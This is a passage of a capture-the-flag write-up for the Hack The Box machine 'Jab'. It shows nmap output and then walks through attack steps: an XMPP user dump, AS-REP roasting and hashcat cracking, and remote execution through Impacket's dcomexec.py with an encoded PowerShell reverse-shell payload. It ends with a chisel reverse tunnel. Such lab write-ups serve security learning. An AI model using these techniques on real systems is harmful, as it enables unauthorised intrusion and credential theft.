| eFWxpjiF8dBJCL+0R2GIA6cBTBtDzaUef9+j3SQMFsFkCRhDQNp/bKxHqKhtlN9/
| oZme6hGGF8OY4J2eiVGz9lRFHTRowE8DCNmMVTQYxzr+SeF3oupizWBBktTu9r9j
| qrW9GmjsVls1KqaZGqA5CaKCYcNMHKHWDbklyF+FtU89kVgm2AdYQUd565kD/LEW
| mahyyTsSDzCbNpweS4P+rv3+JFMEHWpEzMt5tUK7sHfQllIteFlTB3H5epGAKbW3
| 1GFFX2Iq5xqHU9hdDIsqlWUTUQCvqw4XmQIDAQABo2swaTAnBgNVHREEIDAeggxk
| YzAxLmphYi5odGKCDiouZGMwMS5qYWIuaHRiMB0GA1UdDgQWBBTCC/ywRAOodz1W
| S37YI7OhJjTZ6DAfBgNVHSMEGDAWgBTCC/ywRAOodz1WS37YI7OhJjTZ6DANBgkq
| hkiG9w0BAQsFAAOCAQEAP5Qvvsqdy8cHd31YX0ju498doEU665J2e7VT4o3F5vEI
| XV/6BOSc5WBGQifLwAXWpeYjk1CHh3wheh9iQfqi+STxKPDXN159EGRA746bJ684
| AtCqFQAUiqbbwME3aqbhZDvnC0HedaTZN4slWyrn25WK6qTyl3XfCqGRMoGja0tz
| K5nzUPsxH/c46I0BwmjIEY4Gjk487cJdSxLEkeI3ThExso1ib1eICjPGKTkCjLO6
| Jq0a9SrQrlm62x8Ddk9roonWJKYsbnsFjDmMFdMbjnSou4dm0I2BAti0BDDOtTU7
| 2UlHPhyTT552GLTJngvpeF6DVYNUhDaKElcI6DtKXQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     compression_methods: 
|     errors: 
|       (timeout)
|     unknown: 
|     xmpp: 
|     auth_mechanisms: 
|     features: 
|_    capabilities: 
5269/tcp open  xmpp                syn-ack Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     compression_methods: 
|     errors: 
|       (timeout)
|     unknown: 
|     xmpp: 
|     auth_mechanisms: 
|     features: 
|_    capabilities: 
5270/tcp open  ssl/xmpp            syn-ack Wildfire XMPP Client
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   331765e1e84a14c29ac454bab51626d8
| SHA-1: efd08bde42dfff041a797d20bf87a74066b8d966
| -----BEGIN CERTIFICATE-----
| MIIDGzCCAgOgAwIBAgIIbuO/UNJ13hgwDQYJKoZIhvcNAQELBQAwFzEVMBMGA1UE
| AwwMZGMwMS5qYWIuaHRiMB4XDTIzMTAyNjIyMDAxMloXDTI4MTAyNDIyMDAxMlow
| FzEVMBMGA1UEAwwMZGMwMS5qYWIuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAhcGn/b2gf5Dxe3gJqG4HrYEijGX/ds1W72Py8zNDIX7G0+cA+pYA
| eFWxpjiF8dBJCL+0R2GIA6cBTBtDzaUef9+j3SQMFsFkCRhDQNp/bKxHqKhtlN9/
| oZme6hGGF8OY4J2eiVGz9lRFHTRowE8DCNmMVTQYxzr+SeF3oupizWBBktTu9r9j
| qrW9GmjsVls1KqaZGqA5CaKCYcNMHKHWDbklyF+FtU89kVgm2AdYQUd565kD/LEW
| mahyyTsSDzCbNpweS4P+rv3+JFMEHWpEzMt5tUK7sHfQllIteFlTB3H5epGAKbW3
| 1GFFX2Iq5xqHU9hdDIsqlWUTUQCvqw4XmQIDAQABo2swaTAnBgNVHREEIDAeggxk
| YzAxLmphYi5odGKCDiouZGMwMS5qYWIuaHRiMB0GA1UdDgQWBBTCC/ywRAOodz1W
| S37YI7OhJjTZ6DAfBgNVHSMEGDAWgBTCC/ywRAOodz1WS37YI7OhJjTZ6DANBgkq
| hkiG9w0BAQsFAAOCAQEAP5Qvvsqdy8cHd31YX0ju498doEU665J2e7VT4o3F5vEI
| XV/6BOSc5WBGQifLwAXWpeYjk1CHh3wheh9iQfqi+STxKPDXN159EGRA746bJ684
| AtCqFQAUiqbbwME3aqbhZDvnC0HedaTZN4slWyrn25WK6qTyl3XfCqGRMoGja0tz
| K5nzUPsxH/c46I0BwmjIEY4Gjk487cJdSxLEkeI3ThExso1ib1eICjPGKTkCjLO6
| Jq0a9SrQrlm62x8Ddk9roonWJKYsbnsFjDmMFdMbjnSou4dm0I2BAti0BDDOtTU7
| 2UlHPhyTT552GLTJngvpeF6DVYNUhDaKElcI6DtKXQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
5275/tcp open  jabber              syn-ack Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     compression_methods: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     xmpp: 
|       version: 1.0
|     unknown: 
|     stream_id: 5nzmn4abzc
|     auth_mechanisms: 
|     features: 
|_    capabilities: 
5276/tcp open  ssl/jabber          syn-ack Ignite Realtime Openfire Jabber server 3.10.0 or later
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   331765e1e84a14c29ac454bab51626d8
| SHA-1: efd08bde42dfff041a797d20bf87a74066b8d966
| -----BEGIN CERTIFICATE-----
| MIIDGzCCAgOgAwIBAgIIbuO/UNJ13hgwDQYJKoZIhvcNAQELBQAwFzEVMBMGA1UE
| AwwMZGMwMS5qYWIuaHRiMB4XDTIzMTAyNjIyMDAxMloXDTI4MTAyNDIyMDAxMlow
| FzEVMBMGA1UEAwwMZGMwMS5qYWIuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAhcGn/b2gf5Dxe3gJqG4HrYEijGX/ds1W72Py8zNDIX7G0+cA+pYA
| eFWxpjiF8dBJCL+0R2GIA6cBTBtDzaUef9+j3SQMFsFkCRhDQNp/bKxHqKhtlN9/
| oZme6hGGF8OY4J2eiVGz9lRFHTRowE8DCNmMVTQYxzr+SeF3oupizWBBktTu9r9j
| qrW9GmjsVls1KqaZGqA5CaKCYcNMHKHWDbklyF+FtU89kVgm2AdYQUd565kD/LEW
| mahyyTsSDzCbNpweS4P+rv3+JFMEHWpEzMt5tUK7sHfQllIteFlTB3H5epGAKbW3
| 1GFFX2Iq5xqHU9hdDIsqlWUTUQCvqw4XmQIDAQABo2swaTAnBgNVHREEIDAeggxk
| YzAxLmphYi5odGKCDiouZGMwMS5qYWIuaHRiMB0GA1UdDgQWBBTCC/ywRAOodz1W
| S37YI7OhJjTZ6DAfBgNVHSMEGDAWgBTCC/ywRAOodz1WS37YI7OhJjTZ6DANBgkq
| hkiG9w0BAQsFAAOCAQEAP5Qvvsqdy8cHd31YX0ju498doEU665J2e7VT4o3F5vEI
| XV/6BOSc5WBGQifLwAXWpeYjk1CHh3wheh9iQfqi+STxKPDXN159EGRA746bJ684
| AtCqFQAUiqbbwME3aqbhZDvnC0HedaTZN4slWyrn25WK6qTyl3XfCqGRMoGja0tz
| K5nzUPsxH/c46I0BwmjIEY4Gjk487cJdSxLEkeI3ThExso1ib1eICjPGKTkCjLO6
| Jq0a9SrQrlm62x8Ddk9roonWJKYsbnsFjDmMFdMbjnSou4dm0I2BAti0BDDOtTU7
| 2UlHPhyTT552GLTJngvpeF6DVYNUhDaKElcI6DtKXQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     compression_methods: 
|     errors: 
|       (timeout)
|     unknown: 
|     xmpp: 
|     auth_mechanisms: 
|     features: 
|_    capabilities: 
5985/tcp open  http                syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7070/tcp open  realserver?         syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sun, 25 Feb 2024 10:54:55 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sun, 25 Feb 2024 10:55:00 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7443/tcp open  ssl/oracleas-https? syn-ack
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   331765e1e84a14c29ac454bab51626d8
| SHA-1: efd08bde42dfff041a797d20bf87a74066b8d966
| -----BEGIN CERTIFICATE-----
| MIIDGzCCAgOgAwIBAgIIbuO/UNJ13hgwDQYJKoZIhvcNAQELBQAwFzEVMBMGA1UE
| AwwMZGMwMS5qYWIuaHRiMB4XDTIzMTAyNjIyMDAxMloXDTI4MTAyNDIyMDAxMlow
| FzEVMBMGA1UEAwwMZGMwMS5qYWIuaHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAhcGn/b2gf5Dxe3gJqG4HrYEijGX/ds1W72Py8zNDIX7G0+cA+pYA
| eFWxpjiF8dBJCL+0R2GIA6cBTBtDzaUef9+j3SQMFsFkCRhDQNp/bKxHqKhtlN9/
| oZme6hGGF8OY4J2eiVGz9lRFHTRowE8DCNmMVTQYxzr+SeF3oupizWBBktTu9r9j
| qrW9GmjsVls1KqaZGqA5CaKCYcNMHKHWDbklyF+FtU89kVgm2AdYQUd565kD/LEW
| mahyyTsSDzCbNpweS4P+rv3+JFMEHWpEzMt5tUK7sHfQllIteFlTB3H5epGAKbW3
| 1GFFX2Iq5xqHU9hdDIsqlWUTUQCvqw4XmQIDAQABo2swaTAnBgNVHREEIDAeggxk
| YzAxLmphYi5odGKCDiouZGMwMS5qYWIuaHRiMB0GA1UdDgQWBBTCC/ywRAOodz1W
| S37YI7OhJjTZ6DAfBgNVHSMEGDAWgBTCC/ywRAOodz1WS37YI7OhJjTZ6DANBgkq
| hkiG9w0BAQsFAAOCAQEAP5Qvvsqdy8cHd31YX0ju498doEU665J2e7VT4o3F5vEI
| XV/6BOSc5WBGQifLwAXWpeYjk1CHh3wheh9iQfqi+STxKPDXN159EGRA746bJ684
| AtCqFQAUiqbbwME3aqbhZDvnC0HedaTZN4slWyrn25WK6qTyl3XfCqGRMoGja0tz
| K5nzUPsxH/c46I0BwmjIEY4Gjk487cJdSxLEkeI3ThExso1ib1eICjPGKTkCjLO6
| Jq0a9SrQrlm62x8Ddk9roonWJKYsbnsFjDmMFdMbjnSou4dm0I2BAti0BDDOtTU7
| 2UlHPhyTT552GLTJngvpeF6DVYNUhDaKElcI6DtKXQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sun, 25 Feb 2024 10:55:08 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sun, 25 Feb 2024 10:55:15 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7777/tcp open  socks5              syn-ack (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9389/tcp open  mc-nmf              syn-ack .NET Message Framing
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5223-TCP:V=7.93%T=SSL%I=7%D=2/25%Time=65DB1C69%P=x86_64-pc-linux-gn
SF:u%r(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\
SF:.org/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-
SF:streams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7070-TCP:V=7.93%I=7%D=2/25%Time=65DB1C44%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,189,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2025\x20Feb\x202
SF:024\x2010:54:55\x20GMT\r\nLast-Modified:\x20Wed,\x2016\x20Feb\x202022\x
SF:2015:55:02\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20by
SF:tes\r\nContent-Length:\x20223\r\n\r\n<html>\n\x20\x20<head><title>Openf
SF:ire\x20HTTP\x20Binding\x20Service</title></head>\n\x20\x20<body><font\x
SF:20face=\"Arial,\x20Helvetica\"><b>Openfire\x20<a\x20href=\"http://www\.
SF:xmpp\.org/extensions/xep-0124\.html\">HTTP\x20Binding</a>\x20Service</b
SF:></font></body>\n</html>\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20505\x20Unkn
SF:own\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCont
SF:ent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20
SF:505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(HTTPOptions,56,"HT
SF:TP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2025\x20Feb\x202024\x2010:55:00\
SF:x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RPCCheck,C7,"HTTP
SF:/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-Type:\x20
SF:text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConnection:\x2
SF:0close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20
SF:character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTTP/1\.1\x2
SF:0400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;
SF:charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n
SF:\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\
SF:x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400\x20Illeg
SF:al\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8
SF:859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x
SF:20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</
SF:pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Type:\x20tex
SF:t/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnection:\x20cl
SF:ose\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x20URI</pre
SF:>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNT
SF:L=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Leng
SF:th:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1>
SF:<pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7443-TCP:V=7.93%T=SSL%I=7%D=2/25%Time=65DB1C50%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,189,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2025\x20Fe
SF:b\x202024\x2010:55:08\x20GMT\r\nLast-Modified:\x20Wed,\x2016\x20Feb\x20
SF:2022\x2015:55:02\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:
SF:\x20bytes\r\nContent-Length:\x20223\r\n\r\n<html>\n\x20\x20<head><title
SF:>Openfire\x20HTTP\x20Binding\x20Service</title></head>\n\x20\x20<body><
SF:font\x20face=\"Arial,\x20Helvetica\"><b>Openfire\x20<a\x20href=\"http:/
SF:/www\.xmpp\.org/extensions/xep-0124\.html\">HTTP\x20Binding</a>\x20Serv
SF:ice</b></font></body>\n</html>\n")%r(HTTPOptions,56,"HTTP/1\.1\x20200\x
SF:20OK\r\nDate:\x20Sun,\x2025\x20Feb\x202024\x2010:55:15\x20GMT\r\nAllow:
SF:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20505\
SF:x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859-1\
SF:r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Mess
SF:age\x20505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(RPCCheck,C7
SF:,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-Typ
SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConnecti
SF:on:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illeg
SF:al\x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTTP/1
SF:\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text
SF:/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20clo
SF:se\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20char
SF:acter\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400\x2
SF:0Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset
SF:=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1
SF:>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL
SF:=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Type:\
SF:x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnection:
SF:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x20UR
SF:I</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20character\
SF:x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConten
SF:t-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2040
SF:0</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52338/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 13933/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 41585/udp): CLEAN (Timeout)
|   Check 4 (port 7339/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-25T10:56:06
|_  start_date: N/A
|_clock-skew: mean: 1m00s, deviation: 0s, median: 1m00s

Nmap done: 1 IP address (1 host up) scanned in 93.12 seconds
```
Enumerate the DNS.
```markdown
> nslookup
> server 10.10.11.4
Default server: 10.10.11.4
Address: 10.10.11.4#53
> jab.htb
Server:         10.10.11.4
Address:        10.10.11.4#53

Name:   jab.htb
Address: 10.10.11.4
> dc01.jab.htb
Server:         10.10.11.4
Address:        10.10.11.4#53

Name:   dc01.jab.htb
Address: 10.10.11.4
```
Looking at the open port list, we conclude the server is running an Ignite Realtime Openfire Jabber service. This is an RTC server (i.e. chat) under the open protocol for instant messaging XMPP (more info here https://www.igniterealtime.org/projects/openfire).
### USER
Use a Jabber/XMPP client, such as Pidgin, to connect to the chat server. Add a new account for the XMPP protocol in  the `jab.htb` server. Don't forget to click on "Create a new account on this server".

![jab Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/6e0fae55-b88c-4155-9572-a2b9c58a1c80)

A registration pop-up appears allowing us to create a new acocunt in the server, enter whatever user data and click "OK".

![jab Untitled2](https://github.com/g1vi/AllTheWriteUps/assets/120142960/bdda33ca-75ff-4840-ba5b-693182047c8d)

Registration succeeds.

![jab Untitled3](https://github.com/g1vi/AllTheWriteUps/assets/120142960/91fc309b-4b50-41f2-9ae9-c9defd8412f3)

Navigate to `tools -> plugins` and enable the XMPP console plugin.<br>
<br>
Next, navigate to `accounts -> account name -> search for users -> search.jab.htb -> search directory` and launch a search for all registered users. A large list is presented, to dump it in a text file you just need to copy and paste it from the XMPP console and a bit of sed-fu/bash-fu.<br>
<br>
Once you have the users in a text file, launch an "asreproasting" attack with Impacket to look for users with pre-auth disabled.
```markdown
> python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py jab.htb/ -usersfile ./userlist -request -format hashcat -outputfile asrep.hash -dc-ip jab.htb

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User lmccarty doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nenglert doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User aslater doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rtruelove doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User pwoodland doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User pparodi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mhernandez doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User atorres doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User apugh doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lray doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rowens doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mherron doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User larroyo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User csalinas doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User plewis doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rmangold doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User cmaxwell doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User kaddis doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User molivarez doesn't have UF_DONT_REQUIRE_PREAUTH set
[...]
```
After some time, you find a user who does not require pre-auth and his hash, which can be cracked with `hashcat` (module 18200).
```markdown
> hashcat -m 18200 -a 0 -d 1 hash.txt .\rockyou.txt
```
Go back to the chat and connect with the newly disclosed credentials. If you click on "Find room" you will notice he has access to a room called "pentest2033". Access the room and find additional juicy info.

![jab Untitled4](https://github.com/g1vi/AllTheWriteUps/assets/120142960/459a0d71-8a91-4017-95ae-0e42ff27fb92)

Looks like a discussion held between several pentesters who have recently found and cracked credentials for a service account called `svc_openfire`<br>
<br>
You can try these credentials to get RCE from Linux with Impacket, but neither `psexec.py`, `smbexec.py` nor `wmiexec.py` will work since the user is not local administrator; however, if you try `dcomexec.py` it will work since appearently the user is member of the "Distributed COM Users". The members of this group "can launch, activate, and use Distributed COM objects on the computer" (https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups).<br>
<br>
Let's abuse this configuration with Impacket's `dcomexec.py`
```markdown
> python3 /usr/share/doc/python3-impacket/examples/dcomexec.py -object MMC20 jab.htb/svc_openfire:<password here>@10.10.11.4 'cmd /c powershell -e JABjAGwAaQBlAG4AdA[...]' -silentcommand

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
```
A reverse shell for user `svc_openfire` is received on port 1919.

![jab Untitled5](https://github.com/g1vi/AllTheWriteUps/assets/120142960/1448c514-5aa1-472d-ab36-1e0830b4fc2a)

Which can be used to retrieve the user flag.
### SYSTEM
Start from the `svc_openfire` shell and enumerate the current user.
```markdown
> net user svc_openfire

User name                    svc_openfire
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/22/2024 1:35:29 PM
Password expires             Never
Password changeable          1/23/2024 1:35:29 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2/26/2024 10:10:44 AM

Logon hours allowed          All

Local Group Memberships      *Distributed COM Users
Global Group memberships     *Domain Users         
The command completed successfully.
```
We see the user is in fact member of the "Distributed DCOM users" group. Next enumerate the local connections.
```markdown
> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       896
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       896
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:5222           0.0.0.0:0              LISTENING       3132
  TCP    0.0.0.0:5223           0.0.0.0:0              LISTENING       3132
  TCP    0.0.0.0:5262           0.0.0.0:0              LISTENING       3132
  TCP    0.0.0.0:5263           0.0.0.0:0              LISTENING       3132
  TCP    0.0.0.0:5269           0.0.0.0:0              LISTENING       3132
  TCP    0.0.0.0:5270           0.0.0.0:0              LISTENING       3132
  TCP    0.0.0.0:5275           0.0.0.0:0              LISTENING       3132
  TCP    0.0.0.0:5276           0.0.0.0:0              LISTENING       3132
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:7070           0.0.0.0:0              LISTENING       3132
  TCP    0.0.0.0:7443           0.0.0.0:0              LISTENING       3132
  TCP    0.0.0.0:7777           0.0.0.0:0              LISTENING       3132
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2504
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2612
  TCP    127.0.0.1:389          127.0.0.1:49770        ESTABLISHED     636
  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3132
  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       3132
  [...]
```
Notice there is something listening on port 9090, upload a `chisel` and forward the port to Kali.
```markdown
# On Kali
> ./chisel64 server --port 8000 --reverse

2024/02/26 10:23:10 server: Reverse tunnelling enabled
